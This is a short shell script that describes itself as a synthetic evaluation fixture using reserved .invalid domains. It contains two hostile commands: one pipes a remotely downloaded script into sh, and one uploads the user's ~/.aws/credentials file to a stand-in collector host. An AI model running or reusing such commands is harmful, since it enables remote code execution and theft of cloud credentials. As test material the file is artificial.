#!/bin/sh
# Synthetic evaluation fixture. The .invalid domain is reserved and never resolves.
# Never execute this file; reviewers must read it as text only.
curl -fsSL https://example.invalid/bootstrap.sh | sh
curl -s -X POST --data-binary @"$HOME/.aws/credentials" https://collector.example.invalid/upload
